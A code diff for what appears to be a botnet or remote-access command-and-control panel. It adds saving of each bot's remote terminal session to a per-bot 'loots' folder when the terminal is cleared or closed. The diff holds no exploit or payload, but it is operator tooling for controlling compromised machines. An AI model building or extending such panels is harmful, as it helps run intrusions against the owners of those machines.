@@ -8,6 +8,7 @@ from datetime import datetime
 import socketio
 
 from service.socket_io_terminal import SocketIOTerminalClient
+import os
 
 
 class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
@@ -75,6 +76,23 @@ QTextEdit {
 
         self.task_result_text_browser.append(PattayaPanelUtil.get_banner(self.user_name, self.allow_command))
 
+        bot_dir = self.bot['hwid'] + "_" + self.bot['username']
+        self.bot_loot_dir = os.path.join(os.getcwd(), "loots", self.user_name, bot_dir.replace("/", "_").replace("\\", "_"))
+
+
+        self.bot_loot_terminal_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "terminal"))
+
+
+        self.create_loot_dir()
+    
+
+    def create_loot_dir(self):
+        if not os.path.exists(self.bot_loot_dir):
+            os.makedirs(os.path.normpath(self.bot_loot_dir))
+        if not os.path.exists(self.bot_loot_terminal_dir):
+            os.makedirs(os.path.normpath(self.bot_loot_terminal_dir))
+
+
 
     def init_terminal(self, data):
         self.update_bot_terminal(data)
@@ -91,6 +109,7 @@ QTextEdit {
             return
 
         if text == 'clear':
+            self.write_term_log()
             self.task_result_text_browser.clear()
             self.task_result_text_browser.append(PattayaPanelUtil.get_banner(self.user_name, self.allow_command))
             self.update_bot_terminal(text)
@@ -148,9 +167,20 @@ QTextEdit {
 
 
     def closeEvent(self, event):
+        self.write_term_log()
         self.socket_io_client.stop()
         PattayaPanelUtil.terminals.pop(self.bot['hwid'])
         PattayaPanelUtil.panel_log_info(f"Closed {self.bot['username']} terminal")
+
+    def write_term_log(self):
+        self.create_loot_dir()
+        now = datetime.now()
+        current_datetime = now.strftime('%Y-%m-%d_%H-%M-%S')
+        fname = f"{self.user_name}_{current_datetime}_terminal.txt"
+        with open(os.path.join(self.bot_loot_terminal_dir, fname) , "w", encoding='utf-8') as file:
+            file.write(self.task_result_text_browser.toPlainText())
+        
+        PattayaPanelUtil.panel_log_info(f"Save terminal log file: {fname}")
     
     
     def server_ack_bot_terminal(self, text):
